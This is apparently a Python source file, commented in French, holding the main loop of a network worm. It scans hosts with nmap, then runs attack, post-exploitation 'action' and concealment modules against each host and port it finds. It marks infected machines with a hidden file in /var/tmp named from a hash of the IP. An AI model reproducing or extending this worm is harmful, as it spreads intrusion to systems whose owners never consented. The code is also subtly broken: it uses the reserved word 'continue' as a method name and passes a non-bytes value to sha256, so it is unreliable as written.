#Imports
from .utils          import endOfProgramm, getIp
from .nmap           import nmap
from .actions        import __all__         as ACTIONS
from .attaques       import __all__         as ATTAQUES
from .dissimulations import __all__         as DISSIMULATIONS
from queue           import Queue           as FIFO
from signal          import signal, SIGTERM
from importlib       import import_module
from time            import sleep
from os.path         import exists
from hashlib         import sha256

#Classes
class Events():
    """
    Classe repreésentant notre boucle d'éxecution
    """
    def __init__(self):
        """
        Constructeur de la classe
        """
        signal(SIGTERM, endOfProgramm)
        self.isStart           = True
        self.logs              = FIFO()
        
    def run(self):
        """
        Méthode principale, permet de lancer la boucle pseudo infinie qui gère notre vers
        """
        self.isStart = True
        self.cibles  = {}
        while self.isStart:

            if not self.continue():
                break
            
            for (host, port) in nmap(self):
                print(host, port)
                for attaque in ATTAQUES:
                    pkg = import_module(attaque)
                    att = pkg.Attaque(self, host, port)
                    att.run()

                for action in ACTIONS:
                    pkg = import_module(action)
                    act = pkg.Action(self, host, port)
                    act.run()

                for dissimulation in DISSIMULATIONS:
                    pkg = import_module(dissimulation)
                    dis = pkg.Dissimulation(self, host, port)
                    dis.run()
            
            sleep(5)

    def continue(self):
        """
        Mets fin au vers si il est déjà présent, pour ce faire vérifie si /var/tmp/.{{ sha256(myip) }} est présent
        """
        path = f"/var/tmp/.{sha256(getIp()).hexdigest()}"
        if exists(path):
            return False
        else:
            open(path, "w")
            return True

    def stop(self):
        """
        Mets fin à la boucle d'éxecution
        """
        self.isStart = False